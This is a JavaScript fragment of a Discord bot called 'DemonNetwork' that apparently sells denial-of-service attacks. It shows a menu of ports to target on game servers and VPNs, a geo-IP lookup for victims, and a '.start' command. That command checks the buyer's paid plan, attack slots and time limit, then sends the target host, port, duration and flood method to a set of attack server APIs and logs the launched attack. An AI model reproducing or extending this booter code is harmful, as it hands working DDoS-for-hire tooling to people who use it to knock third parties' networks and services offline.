//██       ██████  ██   ██    ██    ███████
case 'ports':
console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Comando: ` + green + `.ports ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)
//
  portsem = new Discord.RichEmbed()
    .setColor("#ff0000")
    .setTitle(":flag_br: - DemonNetwork - Ports Menu - :flag_br:")
    .setThumbnail("https://media.discordapp.net/attachments/683751224721670151/683754179642261629/bc785777947387.png")
    .addField("**Protocol of Ports**", "```http\nHTTP / HOME\nHTTPS / VPN'S\nDNS\nFTP\nSSH\nTELNET\nRDP```", true)
    .addField("**Port**", "```glsl\n80\n443\n53\n21\n22\n23\n3389```", true)
    .addBlankField(true)
    .addField("**GameServer / VPN'S**", "```css\nMinecraft\nCounter Strike\nGTA\nPSN\nMOBILE-AGENT\nMOBILE-MANAGER\nMICROSOFT\nNFO-VPN\nVPN-OVH-NFO\nOPENVPN\nSOFTETHER```", true)
    .addField("**Port**", "```glsl\n25565\n27015\n6672\n3478\n434\n435\n1433\n5355\n7777\n1194\n5555```", true)
    .setTimestamp()
    .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
  return msg.channel.send(portsem);
//
break;
//██████   ██████  ████████    ██ ███    ██ ███████  ██████  
//██   ██ ██    ██    ██       ██ ████   ██ ██      ██    ██ 
//██████  ██    ██    ██ █████ ██ ██ ██  ██ █████   ██    ██ 
//██   ██ ██    ██    ██       ██ ██  ██ ██ ██      ██    ██ 
//██████   ██████     ██       ██ ██   ████ ██       ██████ 
case 'botinfo':
console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Comando: ` + green + `.botinfo ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)
const thumbnailsv2 = [
  "https://media.discordapp.net/attachments/701004910547959868/701012387704078406/giphy.gif",
  "https://media.discordapp.net/attachments/701004910547959868/701013233821286400/tumblr_p4l2boPGAV1wv8cfno1_400.gif",
  "https://media.discordapp.net/attachments/701004910547959868/701019286243901460/DependableHoarseFluke-size_restricted.gif"
];
//
  const botinfoem = new Discord.RichEmbed()
    .setImage(thumbnailsv2[Math.floor(Math.random() * thumbnailsv2.length)])
    .setColor('#000')
    .setThumbnail(`${bot.user.displayAvatarURL}`)
    .setAuthor(`🤖 Minhas informações`)
    .addField('**Username:**', `${bot.user.username}`, true)
    .addField('**Status:**', bot.user.presence.status, true)
    .addField('**BoT ID:**', `${bot.user.id}`, true)
    .addField('**Servidores:**', bot.guilds.size, true)
    .addField("**Developer**", "[@Aguiar503](https://twitter.com/Aguiar503 'Twitter')", true)
    .addField('**Estou online a:**', moment().to(client.startTime), true)
    .addField('**Criado em:**', bot.user.createdAt)
    .setTimestamp()
  return msg.channel.send(botinfoem);
//
break;
//██       ██████   ██████  ██   ██      ██    ██ ██████  
//██      ██    ██ ██    ██ ██  ██       ██    ██ ██   ██ 
//██      ██    ██ ██    ██ █████  █████ ██    ██ ██████  
//██      ██    ██ ██    ██ ██  ██       ██    ██ ██      
//███████  ██████   ██████  ██   ██       ██████  ██ 
case 'lookup':
if (args.length < 1) {
console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `Preenchimento Incorreto` + reset + ` Network: ` + purple + `PAID`)
//  
  const lookembed = new Discord.RichEmbed()
    .setColor("#ff0000")
    .setTitle(":flag_br: ERROR LOG :flag_br:")
    .setThumbnail(`${msg.author.displayAvatarURL}`)
    .addField("**Error**", "You filled in the data ***incorrectly***, look at the **correct** form below:")
    .addField("**__Correct Form__**", "```ini\n!lookup [host]```", true)
    .addField("**__Author__**", "```ini\n" + msg.author.username + "```", true)
    .setTimestamp()
    .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
  return msg.channel.send(lookembed);
//
}
const { data } = await axios.get(`http://free.ipwhois.io/json/${args[0]}`),
//
   response = new Discord.RichEmbed()
    .setColor("#249c2b")
    .setTitle(":flag_br: - DemonNetwork - Host Lookup Tool - :flag_br:")
    .setDescription("Dados do Host requisitado.")
    .setThumbnail("https://cdn.discordapp.com/attachments/668654887650983936/668678545131831306/1024px-Circle-icons-tools.png")
    .addField("```IP```", "```yaml\n" + data.ip + "```", true)
    .addField("```CONTINENT```", "```yaml\n" + data.continent + "```", true)
    .addField("```TYPE```", "```yaml\n" + data.type + "```", true)
    .addField("```COUNTRY```", "```http\n" + data.country + "```", true)
    .addField("```STATE```", "```http\n" + data.region + "```", true)
    .addField("```CITY```", "```http\n" + data.city + "```", true)
    .addField("```ISP```", "```yaml\n" + data.isp + "```", true)
    .addField("```AUTHOR```", "```yaml\n" + msg.author.username + "```", true)
    .addBlankField(true)
    .setTimestamp()
    .setFooter("GEO-IP LookUP Tool", "https://cdn.discordapp.com/attachments/668654887650983936/668678545131831306/1024px-Circle-icons-tools.png");
    console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + green + `[API] ` + reset + `Tool:` + green + ` GEO-LOOK ` + reset + `Host: ` + green + args[0] + reset + ` Type: ` + green + data.type + reset + ` Author: ` + green + `${msg.author.username}`)
  return msg.channel.send(response);
//
break;

//███████ ████████  █████  ██████  ████████ 
//██         ██    ██   ██ ██   ██    ██    
//███████    ██    ███████ ██████     ██    
//     ██    ██    ██   ██ ██   ██    ██    
//███████    ██    ██   ██ ██   ██    ██   
// Keyword: "STARTATTACK"
// █████  ████████ ████████  █████   ██████ ██   ██ 
//██   ██    ██       ██    ██   ██ ██      ██  ██  
//███████    ██       ██    ███████ ██      █████   
//██   ██    ██       ██    ██   ██ ██      ██  ██  
//██   ██    ██       ██    ██   ██  ██████ ██   ██
case 'start': 
//return msg.channel.send("em manutenção, mano / Under Maintenance bro")
function hasPackage(person) {
  var expire = users[person].expire;

  if(expire > moment().unix()) {
    return true;
  } else {
    return false;
  }
}
if (!hasPackage(msg.author.id)) {
console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `Sem Plano` + reset)
const embed3 = new Discord.RichEmbed()
  .setColor("#ff0000")
  .setTitle(":flag_br: ERROR LOG :flag_br:")
  .setDescription("Authentication Error")
  .setThumbnail(`${msg.author.displayAvatarURL}`)
  .addField("**Error**", "You have no plan to send an attack.", true)
  .setTimestamp()
  .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
return msg.channel.send(embed3); }
}

let serverusers;
  if (users[msg.author.id].servers.includes("Simple")) {
    server = SimpleAPI;
    size = SimpleAPI.length;
    network = "Simple";
    plano = "Simples"
  } else if (users[msg.author.id].servers.includes("Normal")) {
    server = NormalAPI;
    size = NormalAPI.length;
    network = "Normal";
    plano = "Normal" 
  } else if (users[msg.author.id].servers.includes("Advanced")) {
    server = AdvancedAPI;
    size = AdvancedAPI.length;
    network = "Advanced";
    plano = "Advanced" 
  } else {
    server = "No Plan"
  }
//
function update(file, json) {
  fs.writeFile(file, JSON.stringify(json, null, 2), "utf8", function(err) {
    console.log(purple + "[" + reset + moment.tz("America/Sao_Paulo").format('HH:mm A') + purple + "] " + `[` +  reset + `${bot.user.username}` + purple + `] Banco de Dados atualizado.`);
  });
}
//
function makeUser(person) {
  users[person] = {};
  users[person].concurrents = 0;
  users[person].attackTime = 0;
  users[person].attacks = [];
  users[person].expire = null;
  update("users.json", users);
}
if (!users[msg.author.id]) {
  makeUser(msg.author.id);
}
//
function getRunning(person) {
  let running = 0;
  for (const attack of users[person].attacks) {
    if (attack.stamp > moment().unix() && attack.stopped === false) {
      running++;
    }
  }
  return running;
}
const running = await getRunning(msg.author.id);
if (running >= users[msg.author.id].concurrents) {
  console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `Corrente` + reset + ` Network: ` + purple + `PAID` + reset)
    const concurrent = new Discord.RichEmbed()
      .setColor("#ff0000")
      .setTitle(":flag_br: ERROR LOG :flag_br:")
      .setThumbnail(`${msg.author.displayAvatarURL}`)
      .addField("**Why?**", "You have no slots to send an attack.", true)
      .addField("**What i can do?**", "Wait for your attack to end before sending another.", true)
      .setTimestamp()
      .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
    return msg.channel.send(concurrent);
}

function validatePort(port) {
    if (port > 0 & port < 65535) {
        return (true)
    }
    return (false)
}
function ValidateIPaddress(ipaddress) {
  if (/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ipaddress)) {
    return true;
  }
  return false;
}
if (args.length < 4) {
  console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `Preenchimento Incorreto` + reset + ` Network: ` + purple + plano + reset)
    const argsembed = new Discord.RichEmbed()
      .setColor("#ff0000")
      .setTitle(":flag_br: ERROR LOG :flag_br:")
      .setDescription("Incorrect Completion")
      .setThumbnail(`${msg.author.displayAvatarURL}`)
      .addField("**Error**", "You filled in the data ***incorrectly***, look at the **correct** form below:")
      .addField("**__Correct Form__**", "```ini\n.start [host] [port] [time] [method]```", true)
      .setTimestamp()
      .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
    return msg.channel.send(argsembed);
}
if (!ValidateIPaddress(args[0])) {
  console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `Host Inválido` + reset + ` Network: ` + purple + `PAID` + reset)
    const argsembed = new Discord.RichEmbed()
      .setColor("#ff0000")
      .setTitle(":flag_br: ERROR LOG :flag_br:")
      .setDescription("Invalid Host")
      .setThumbnail(`${msg.author.displayAvatarURL}`)
      .addField("**Error**", "The IP you determined is invalid. Determine a valid IP.")
      .addField("**Valid IP's**", "`1.1.1.1` - `255.255.255.255`", true)
      .setTimestamp()
      .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
    return msg.channel.send(argsembed);
}
if(config.blacklist.hosts.includes(args[0])){
  console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `BlackList ` + reset + `Host: ` + green + args[0] + reset + ` Network: ` + purple + `PAID`)
    const blackembed = new Discord.RichEmbed()
      .setColor("#ff0000")
      .setTitle(":flag_br: ERROR LOG :flag_br:")
      .setDescription("BlackList")
      .setThumbnail(`${msg.author.displayAvatarURL}`)
      .addField("**__Error__**", "You cannot send attacks to this Host,\n this ip is on the **Demon BlackList**.", true)
      .addField("**__Host__**", "**" + args[0] + "**", true)
      .setTimestamp()
      .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
    return msg.channel.send(blackembed);
}

if(config.methods.layer7.includes(args[3])){
function function1() {
    // stuff you want to happen right away
console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `Metodo Indisponivel ` + reset + `Host: ` + green + args[0] + reset + ` Network: ` + purple + `PAID`)
const metodosl7em = new Discord.RichEmbed()
  .setColor("#ff0000")
  .setTitle(":flag_br: ERROR LOG :flag_br:")
  .setThumbnail(`${msg.author.displayAvatarURL}`)
  .addField("**__Error__**", "You cannot use this method \nin this command,\n use it in `.start-L7`.\n\n Check the `correct form` below:.", true)
  .addField("**__Host__**", "**" + args[0] + "**", true)
  .setTimestamp()
  .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
msg.channel.send(metodosl7em);
}

function function2() {
    // all the stuff you want to happen after that pause
const metodosl7em = new Discord.RichEmbed()
  .setColor("#ff0000")
  .setDescription("```ini\n.start-L7 [site] [port] [time] " + args[3] + "```")
  return msg.channel.send(metodosl7em);
}

// call the first chunk of code right away
function1();

// call the rest of the code and have it execute after 3 seconds
setTimeout(function2, 3000);

} else {
    if (!args[0] || !args[1] || !args[2] || !args[3]) return;
    if (!validatePort(args[1])) {
      console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `Porta inválida` + reset + ` Network: ` + purple + `PAID`)
      const portembed = new Discord.RichEmbed()
        .setColor("#ff0000")
        .setTitle(":flag_br: ERROR LOG :flag_br:")
        .setDescription("Invalid Port")
        .setThumbnail(`${msg.author.displayAvatarURL}`)
        .addField("**__Error__**", "The port you chose cannot be used. You can choose ports between `1` and `65535`.")
        .setTimestamp()
        .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
      return msg.channel.send(portembed);
    }
    for (var i = 0; i < config.methods.layer4.length; i++) {
        metodos2 = metodos2 + " " + config.methods.layer4[i];
    }
    if (!config.methods.layer4.includes(args[3].toUpperCase())) {
      console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `Método inválido` + reset + ` Network: ` + purple + `PAID`)
      const metodoembed = new Discord.RichEmbed()
        .setColor("#ff0000")
        .setTitle(":flag_br: ERROR LOG :flag_br:")
        .setDescription("Invalid Method")
        .setThumbnail(`${msg.author.displayAvatarURL}`)
        .addField("**__Error__**", "The method you requested was not found in the DemonNetwork database, use: `.methods` to check the available methods.", true)
        .addField("**__Host__**", "**" + args[0] + "**", true)
        .setTimestamp()
        .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
      return msg.channel.send(metodoembed);
    }
        if (users[msg.author.id].attackTime < args[2]) {
          console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `TIME` + reset + ` Network: ` + purple + `Simple`)
          const plan1 = new Discord.RichEmbed()
            .setColor("#ff0000")
            .setTitle(":flag_br: ERROR LOG :flag_br:")
            .setDescription("Maximum Time Exceeded")
            .setThumbnail(`${msg.author.displayAvatarURL}`)
            .addField("**__Typed Time__**", "**" + args[2] + "**", true)
            .addField("**__Maximum Time__**", `${users[msg.author.id].attackTime}`, true)
            .addField("**__Your Plan__**", "**Simple**", true)
            .setTimestamp()
            .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
          return msg.channel.send(plan1);
        }
    
    for (var i = 0; i < server.length; i++) {
        axios.get(format(server[i], args[0], args[1], args[2], args[3].toUpperCase())).catch(error => {
            console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + "[✘] " + reset + error)
            const embed1 = new Discord.RichEmbed()
              .setColor("#ff0000")
              .setTitle(":flag_br: ERROR LOG :flag_br:")
              .setDescription("Disconnection error")
              .setThumbnail("https://media.discordapp.net/attachments/691620895386501191/691626561191018661/server.png?width=503&height=400")
              .addField("**Server**", error, true)
              .setTimestamp()
              .setFooter("Server Down - Demon Network");
            const erros = bot.channels.get('692184346806845601');
            return erros.send(embed1);
        })
    }
const attackOptions = {
  from: 'slamanteste@gmail.com',
  to: 'aguiarmodz@gmail.com',
  subject: `[L4] ${msg.author.username} - ${args[0]}`,
  text: `New Attack Launched:\n\n  Author Username: ${msg.author.username}\n  Author ID: ${msg.author.id}\n  Network: ${network}\n\nHost: ${args[0]}\nPort: ${args[1]}\nSeconds: ${args[2]}\nMethod: ${args[3]}\nServers: ${size}`
};  
    transporter.sendMail(attackOptions, function(error, info){
      if (error) {
        console.log(error);
      } else {
        console.log('eae menó');
    }});
    const { data } = await axios.get(`http://free.ipwhois.io/json/${args[0]}`)
    console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + l4cyan +`[L4] ` + l4cyan +`${msg.author.username} ` + reset + `- Network: ` + l4cyan + network + reset + ` Host: ` + l4cyan + args[0] + reset +" Port: " + l4cyan + args[1] + reset +" Time: " + l4cyan + args[2] + reset + " Method: " + l4cyan + args[3] + reset + " Servers: " + l4cyan + size + reset)
    const sec = ['SEC']
    const n = ['']
    const embed2 = new Discord.RichEmbed()
      .setAuthor(`Click here to join the Telegram group.`,"https://media.discordapp.net/attachments/691620895386501191/698080215787765784/grim-reaper-esport-gaming-mascot-logo-template_20684-278.jpg?width=397&height=397","https://t.me/demonv2")
      .setTitle("```[🔥] Demon-Network V3 - Attack [🔥]```")
      .setColor("#8b1e9b")
      .setThumbnail("https://media.discordapp.net/attachments/691620895386501191/697867343405121648/wp-otimizacao-guia.png?width=367&height=397")
      .addField("**__[1] Host__**", "```css\n" + args[0] + "```", true)
      .addField("**__[2] Port__**", "```yaml\n" + args[1] + "```", true)
      .addField("**__[3] Time__**", "```glsl\n" + args[2] + " " + sec + "```", true)
      .addField("**__[4] Method__**", "```yaml\n" + args[3].toUpperCase() + "```", true)
      .addField("**__[5] Servers__**", "```http\n" + size + "```", true)
      .addField("**__[6] Plan__**", "```css\nPAID```", true)
      .addField("**__[7] Network__**", "```http\n" + network + "```", true)
      .addField("**__[8] Response__**", "```glsl\n" + (timeout[Math.floor(Math.random() * timeout.length)]) + " ms```", true)
      .addField("**__[9] Moment__**", "```glsl\n" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "```", true)
      .addField("**__[10] ISP__**", "```http\n" + data.isp + "```", true)
      .addField("⠀", "⠀", true)
      .addField("⠀", "⠀", true)
      //.addField("**__[11] Follow__**", "[@Aguiar503](https://t.me/demonv2 'Demon Updates')", true)
      .setTimestamp()
      .setFooter(`${msg.author.username}, Attack Log.`, `${msg.author.displayAvatarURL}`);
      msg.channel.send(embed2)
      const canal = bot.channels.get('692148143684452422');
      canal.send(embed2);
      const target = args[0];
      const port = args[1];
      const time = args[2];
      const method = args[3]
      var expirer = moment().add(time, "second");
      users[msg.author.id].attacks.push({
      target,
      port,
      time,
      method: method.toUpperCase(),
      stamp: moment(expirer).unix(),
      stopped: false
    });
    update("users.json", users);
  }
return;
}});
